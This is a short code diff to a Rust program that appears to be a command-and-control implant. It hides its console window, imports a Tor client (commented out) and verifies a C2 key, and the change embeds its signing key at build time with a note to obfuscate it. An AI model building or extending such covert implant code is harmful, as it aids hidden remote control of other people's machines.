@@ -1,5 +1,5 @@
 #![windows_subsystem = "windows"]
-use std::{env, fs, path::Path, thread, time};
+use std::{env, fs, thread, time};
 
 // use arti_client::{TorClient, TorClientConfig};
 // use arti_hyper::ArtiHttpConnector;
@@ -122,17 +122,17 @@ fn failsafe_loop(
     Ok(())
 }
 
-pub fn signing_key() -> AgentResult<crypto::SigningKey> {
-    let signing_key_path = dirs::data_local_dir().unwrap().join(Path::new(".hermes"));
-    let signing_key = if Path::new(&signing_key_path).exists() {
-        crypto::get_signing_key_from(fs::read(&signing_key_path)?.as_slice().try_into().unwrap())
-    } else {
-        let signing_key = crypto::get_signing_key();
-        fs::write(&signing_key_path, signing_key.as_bytes())?;
-        signing_key
-    };
-    Ok(signing_key)
-}
+// pub fn signing_key() -> AgentResult<crypto::SigningKey> {
+//     let signing_key_path = dirs::data_local_dir().unwrap().join(Path::new(".hermes"));
+//     let signing_key = if Path::new(&signing_key_path).exists() {
+//         crypto::get_signing_key_from(fs::read(&signing_key_path)?.as_slice().try_into().unwrap())
+//     } else {
+//         let signing_key = crypto::get_signing_key();
+//         fs::write(&signing_key_path, signing_key.as_bytes())?;
+//         signing_key
+//     };
+//     Ok(signing_key)
+// }
 
 fn main() -> AgentResult<()> {
     if env::var("RUST_LOG").is_err() {
@@ -148,7 +148,10 @@ fn main() -> AgentResult<()> {
     info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
     let agent_path = env::current_exe()?;
 
-    let mut signing_key = signing_key()?;
+    // let mut signing_key = signing_key()?;
+    // TODO Obfuscate the signing key
+    let mut signing_key =
+        crypto::get_signing_key_from(include_bytes!(concat!(env!("OUT_DIR"), "/id.key")));
     let c2_verifying_key = crypto::VerifyingKey::from_bytes(
         BASE64_STANDARD
             .decode(C2_VERIFYING_KEY)?
